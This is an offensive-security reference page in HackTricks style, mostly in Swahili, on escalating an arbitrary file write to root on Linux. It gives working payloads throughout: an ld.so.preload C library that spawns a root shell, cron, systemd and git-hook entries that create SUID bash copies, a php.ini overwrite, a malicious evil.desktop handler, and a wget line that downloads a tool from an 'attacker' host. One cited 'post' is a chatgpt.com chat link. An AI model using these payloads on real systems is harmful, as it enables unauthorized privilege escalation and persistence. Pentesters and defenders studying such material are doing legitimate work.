# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Faili hii inafanya kazi kama env variable **`LD_PRELOAD`**, lakini pia inafanya kazi katika **SUID binaries**.\
Ikiwa unaweza kuunda au kuihariri, unaweza kuongeza tu **njia ya maktaba itakayopakiwa** kwa kila binary itakayotekelezwa.

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** zinazofanywa (**run**) kwenye **events** mbalimbali katika git repository kama wakati **commit** inaundwa, **merge**... Kwa hivyo ikiwa **privileged script or user** anafanya vitendo hivi mara kwa mara na inawezekana **write in the `.git` folder`**, hii inaweza kutumika kwa **privesc**.

Kwa mfano, inawezekana **generate a script** katika git repo ndani ya **`.git/hooks`** ili itekelezwe kila wakati commit mpya inapotengenezwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Mafaili ya Wakati

Ikiwa unaweza **kuandika faili zinazohusiana na cron ambazo root anaendesha**, kawaida unaweza kupata code execution mara kazi itakapotekelezwa ijayo. Lengo lenye kuvutia ni pamoja na:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab ya root katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- `systemd` timers na services wanazochochea

Uchunguzi wa haraka:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Ongeza kazi mpya ya root ya cron** kwa `/etc/crontab` au faili katika `/etc/cron.d/`
- **Badilisha skripti** ambayo tayari inatekelezwa na `run-parts`
- **Backdoor target ya timer iliyopo** kwa kubadilisha skripti au binary inayoanzishwa na timer

Mfano wa payload ndogo ya cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayotekelezwa hapo badala yake:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Maelezo:

- `run-parts` kawaida huwaacha majina ya faili yanayojumisha nukta, hivyo tumia majina kama `backup` badala ya `backup.sh`.
- Baadhi ya distros zinatumia `anacron` au timers za `systemd` badala ya cron ya kawaida, lakini wazo la matumizi mabaya ni sawa: **badilisha kile ambacho root atatekeleza baadaye**.

### Faili za Service & Socket

Ikiwa unaweza kuandika **`systemd` unit files** au faili zinazotajwa nao, unaweza kupata utekelezaji wa msimbo kama root kwa kureload na kuanzisha upya unit, au kwa kusubiri njia ya uanzishaji ya service/socket ichukue hatua.

Malengo yenye kuvutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides katika `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries zinazotajwa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Njia za `EnvironmentFile=` zinazoweza kuandikwa zinazoingizwa na service ya root

Ukaguzi wa haraka:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Andika tena `ExecStart=`** katika unit ya service inayomilikiwa na root ambayo unaweza kuibadilisha
- **Add a drop-in override** yenye `ExecStart=` ya hatari na uifute ile ya zamani kwanza
- **Backdoor the script/binary** tayari iliyorejelewa na unit
- **Hijack a socket-activated service** kwa kubadilisha faili ya `.service` inayofanana ambayo huanza wakati socket inapopokea muunganisho

Mfano wa override yenye madhara:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Mtiririko wa kawaida wa uanzishaji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ikiwa huwezi kuanzisha tena services mwenyewe lakini unaweza kuhariri socket-activated unit, huenda ukahitaji tu **kusubiri muunganisho wa mteja** ili kusababisha utekelezaji wa backdoored service kama root.

### Kuandika juu ya `php.ini` yenye vikwazo inayotumika na PHP sandbox iliyopatiwa ruhusa za juu

Baadhi ya daemons maalum huthibitisha PHP iliyotolewa na mtumiaji kwa kuendesha `php` na **`php.ini` yenye vikwazo** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyosanidiwa ndani ya sandbox bado ina **primitive yoyote ya kuandika** (kama `file_put_contents`) na unaweza kufikia **njia kamili ya `php.ini`** inayotumika na daemon, unaweza **kuandika juu ya config hiyo** ili kuondoa vikwazo kisha kutuma payload ya pili ambayo itaendeshwa kwa ruhusa zilizoinuliwa.

Mtiririko wa kawaida:

1. Payload ya kwanza inaandika juu ya config ya sandbox.
2. Payload ya pili inatekeleza code sasa kwamba dangerous functions zimeruhusiwa tena.

Mfano mdogo (badilisha njia inayotumika na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inaendesha kama root (au inathibitisha kwa njia zilizo milikiwa na root), utekelezaji wa pili hutoa muktadha wa root. Hii kwa msingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika mafaili.

### binfmt_misc

Faili iliyoko katika `/proc/sys/fs/binfmt_misc` inaonyesha binary gani inapaswa kutekeleza aina gani ya mafaili. TODO: angalia mahitaji ya kutumia hili kutekeleza rev shell wakati aina ya kawaida ya faili imefunguliwa.

### Overwrite schema handlers (like http: or https:)

Attacker mwenye ruhusa za kuandika kwenye configuration directories za victim anaweza kwa urahisi kubadilisha au kuunda mafaili yanayobadilisha tabia ya mfumo, na kusababisha unintended code execution. Kwa kubadilisha faili `$HOME/.config/mimeapps.list` ili kuonyesha HTTP na HTTPS URL handlers kwa faili hatarishi (mfano, kuweka `x-scheme-handler/http=evil.desktop`), the attacker anahakikisha kwamba **clicking any http or https link triggers code specified in that `evil.desktop` file**. Kwa mfano, baada ya kuweka msimbo hatarishi ufuatao katika `evil.desktop` ndani ya `$HOME/.local/share/applications`, kubofya URL yoyote ya nje kutafanya amri iliyojumuishwa itekelezwe:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Kwa maelezo zaidi angalia [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) ambapo ilitumiwa ku-exploit a real vulnerability.

### Root inayoendesha scripts/binaries zinazoweza kuandikwa na mtumiaji

Ikiwa workflow yenye ruhusa inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya directory inayomilikiwa na mtumiaji asiye na ruhusa), unaweza kuihijack:

- **Gundua utekelezaji:** fuatilia michakato kwa [pspy](https://github.com/DominicBreuker/pspy) ili kukamata root akiita njia zinazodhibitiwa na mtumiaji:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Thibitisha uwezo wa kuandika:** hakikisha faili lengwa na saraka (directory) yake vinamilikiwa na mtumiaji wako na vinaweza kuandikwa.
- **Hijack the target:** backup binary/script ya asili na drop payload ambayo inaunda SUID shell (au tendo lolote la root), kisha rejesha permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Chochea kitendo chenye ruhusa** (kwa mfano, kubonyeza kitufe cha UI kinachozindua helper). Wakati root anatekeleza tena hijacked path, pata escalated shell kwa `./rootshell -p`.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
